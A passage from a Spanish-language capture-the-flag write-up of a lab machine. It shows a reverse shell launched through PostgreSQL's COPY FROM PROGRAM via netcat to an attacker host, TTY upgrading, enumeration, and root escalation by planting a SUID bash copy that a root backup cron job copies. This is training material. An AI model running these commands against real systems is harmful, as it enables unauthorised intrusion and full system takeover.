+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres=# COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.241 443 &gt;/tmp/f';
+</code></pre></div></div>
+<ul>
+<li>Y nos llega la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.241] from (UNKNOWN) [10.129.234.160] 47464
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+postgres
+$ id
+uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+postgres@slonik:/var/lib/postgresql/14/main$ export TERM=xterm
+export TERM=xterm
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/var/lib/postgresql/14/main$ ^Z
+zsh: suspended  nc -nlvp 443
+❯ stty raw -echo;fg
+[1]  + continued  nc -nlvp 443
+                              reset xterm
+ENTER
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Ahora ya podemos ver la user flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/$ find / -user postgres -name &quot;*.txt&quot; 2&gt;/dev/null
+/var/lib/postgresql/user.txt
+^C
+postgres@slonik:/$ cat /var/lib/postgresql/user.txt
+2b5f3f93ef223555f4a5a8b29393fe9d
+postgres@slonik:/$
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li><p>Vamos a comenzar enumerando el sistema y comenzaremos buscando archivos que tengan el privilegio SUID que significa que cuando se ejecuta ese archivo se ejecuto con los permisos del dueño del archivo no con el de nosotros.</p>
+</li>
+<li><p>Encontramos el pkexec &lt;<a href="https://github.com/ly4k/PwnKit">https://github.com/ly4k/PwnKit</a>&gt; pero no es la idea.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/$ find \-perm -4000 2&gt;/dev/null
+./usr/lib/snapd/snap-confine
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/bin/newgrp
+./usr/bin/umount
+./usr/bin/su
+./usr/bin/gpasswd
+./usr/bin/fusermount3
+./usr/bin/chsh
+./usr/bin/passwd
+./usr/bin/mount
+./usr/bin/sudo
+./usr/bin/pkexec
+./usr/bin/chfn
+./usr/sbin/mount.nfs
+</code></pre></div></div>
+<ul>
+<li>Vamos a ver tareas CRON que se estén ejecutando con el siguiente script.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/tmp$ cat proc.sh 
+#!/bin/bash
+
+old_process=$(ps -eo command)
+
+while true; do
+    new_process=$(ps -eo command)
+    diff &lt;(echo &quot;$old_process&quot;) &lt;(echo &quot;$new_process&quot;) | \
+      grep &quot;[\&gt;\&lt;]&quot; | \
+      grep -v &quot;procmon.sh&quot; | \
+      grep -v &quot;command&quot; | \
+      grep -v kworker
+    old_process=$new_process
+    sleep 1
+done
+</code></pre></div></div>
+<ul>
+<li>Encontramos que se esta ejecutando /bin/sh -c /usr/bin/backup.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/tmp$ ./proc.sh 
+&lt; /snap/amazon-ssm-agent/7628/amazon-ssm-agent
+&gt; /snap/amazon-ssm-agent/7628/amazon-ssm-agent
+&gt; /usr/sbin/CRON -f -P
+&gt; /bin/sh -c /usr/bin/backup
+&gt; /bin/bash /usr/bin/backup
+</code></pre></div></div>
+<ul>
+<li>Este es su contenido.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/tmp$ cat /usr/bin/backup
+#!/bin/bash
+
+date=$(/usr/bin/date +&quot;%FT%H%M&quot;)
+/usr/bin/rm -rf /opt/backups/current/*
+/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
+/usr/bin/zip -r &quot;/var/backups/archive-$date.zip&quot; /opt/backups/current/
+
+count=$(/usr/bin/find &quot;/var/backups/&quot; -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)
+if [ &quot;$count&quot; -gt 10 ]; then
+  /usr/bin/rm -rf /var/backups/*
+fi
+postgres@slonik:/tmp$
+</code></pre></div></div>
+<blockquote>
+<p>El script genera un respaldo completo de la base de datos PostgreSQL usando pg_basebackup, elimina copias anteriores, guarda el nuevo respaldo comprimido con marca de tiempo y limpia el directorio de respaldos cuando excede un límite definido para evitar el uso excesivo de almacenamiento.</p>
+</blockquote>
+<ul>
+<li><p>La idea es abusar del proceso de respaldo de PostgreSQL, que copia todo lo que esté dentro del directorio principal de PostgresSQL, para hacer un binario malicioso (/bin/bash con el bit SUID activado) cuando el backup se ejecuta como root, ese binario se copia a /opt/backups/current conservando permisos de root y SUID, permitiendo luego ejecutar una shell con privilegios de root.</p>
+</li>
+<li><p>Lo que haremos es copiar nuestra /bin/bash y darle permisos SUID y ya estaría.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/var/lib/postgresql/14/main$ cp /bin/bash pwned
+postgres@slonik:/var/lib/postgresql/14/main$ chmod 4755 pwned
+</code></pre></div></div>
+<ul>
+<li>Vamos a esperar que la tarea CRON se ejecute.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/var/lib/postgresql/14/main$ watch -n 1 ls -l pwned
+</code></pre></div></div>
+<ul>
+<li>Ahora vemos que ya tiene permisos SUID.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">-rwsr-xr-x 1 postgres postgres 1396520 Feb  7 03:51 pwned
+</code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<ul>
+<li>Ahora nos convertimos en root y leemos la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">postgres@slonik:/var/lib/postgresql/14/main$ /opt/backups/current/pwned -p
+pwned-5.1# whoami
+root
+pwned-5.1# cat /root/root.txt
+2cb582cd567bfd996cdb742eb1d544de
+pwned-5.1#
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
